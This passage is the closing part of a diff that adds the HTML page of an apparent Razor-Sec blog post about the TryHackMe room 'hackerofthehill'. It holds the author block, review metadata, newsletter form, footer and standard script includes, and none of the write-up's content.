+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name font-weight-bold">Razor-Admin</span> 
+                
+                <span class="post-date">23 Feb 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    <script type="application/ld+json">
+    {
+    "@context": "http://schema.org/",
+    "@type": "Review",
+    "itemReviewed": {
+    "@type": "Thing",
+    "name": "Tryhackme hackerofthehill"
+    },
+    "author": {
+    "@type": "Person",
+    "name": "Razor-Admin"
+    },
+    "datePublished": "2021-03-11",
+    "reviewRating": {
+    "@type": "Rating",
+    "ratingValue": "4.5",
+    "bestRating": "5"
+    }
+    }
+    </script>
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/logo.png" class="newsletter-logo" alt="Razor-Sec"> &nbsp; Never miss a <b>story</b> from us, subscribe to our newsletter</span>
+        <form action="https://wowthemes.us11.list-manage.com/subscribe/post?u=8aeb20a530e124561927d3bd8&amp;id=8c3d2d214b" method="post" name="mc-embedded-subscribe-form" class="wj-contact-form validate" target="_blank" novalidate>
+            <div class="mc-field-group d-inline-flex">
+            <input type="email" placeholder="Your e-mail" name="EMAIL" class="required email" id="mce-EMAIL" autocomplete="on" required>
+            <input type="submit" value="Subscribe" name="subscribe" class="heart">
+            </div>
+        </form>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Razor-Sec 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                Created by <a target="_blank" href="">Razor-Sec </a> 
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//Demo-RazorSec.disqus.com/count.js"></script>
+
+
+</body>
+</html>
